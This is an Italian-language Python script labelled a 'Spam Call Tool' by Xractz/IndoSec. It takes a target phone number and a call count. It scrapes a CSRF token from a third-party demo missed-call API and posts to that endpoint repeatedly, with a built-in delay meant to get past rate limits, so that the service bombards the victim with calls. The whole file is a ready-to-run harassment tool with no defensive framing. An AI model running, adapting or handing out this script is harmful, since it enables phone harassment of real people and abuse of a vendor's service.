# Xractz - IndoSec (Versione migliorata)
import time
import re
import sys
from requests import Session

s = Session()

print("📞 Spam Call Tool - by Xractz | IndoSec")
print("⚠️  Delay automatico di 5 secondi per evitare limiti!")
print("📌 Inserisci il numero con prefisso internazionale. Es: 39xxxxxxxxx per l'Italia.\n")

try:
    no = input("Numero : ").strip()
    if not no.isdigit():
        raise ValueError
    if not no.startswith("39"):
        print("⚠️  Nota: il numero dovrebbe iniziare con '39' per l'Italia.")
    jml = int(input("Conteggio chiamate : "))
    print()
except ValueError:
    print("\n❌ Errore: Inserisci solo numeri.")
    sys.exit()

url = "https://www.citcall.com/demo/misscallapi.php"

try:
    tkn = s.get(url).text
    token = re.findall(r'id="csrf_token" value="(.*?)">', tkn)[0]
except Exception as e:
    print(f"❌ Errore nel recupero del token CSRF: {e}")
    sys.exit()

headers = {
    'x-requested-with': 'XMLHttpRequest'
}
data = {
    'cid': no,
    'trying': '0',
    'csrf_token': token
}

n = 0
try:
    while n < jml:
        send = s.post(url, data=data, headers=headers).text
        time.sleep(4.8)
        if 'Success' in send:
            n += 1
            print(f"[{n}] ✅ Inviato al numero: {no}")
        else:
            print("\n⚠️  Limite raggiunto o errore dal server.")
            print("⏳ Riprova tra un'ora o domani.")
            break
except KeyboardInterrupt:
    print("\n⛔ Interrotto dall'utente.")
except Exception as e:
    print(f"\n❌ Errore imprevisto: {e}")
    sys.exit()
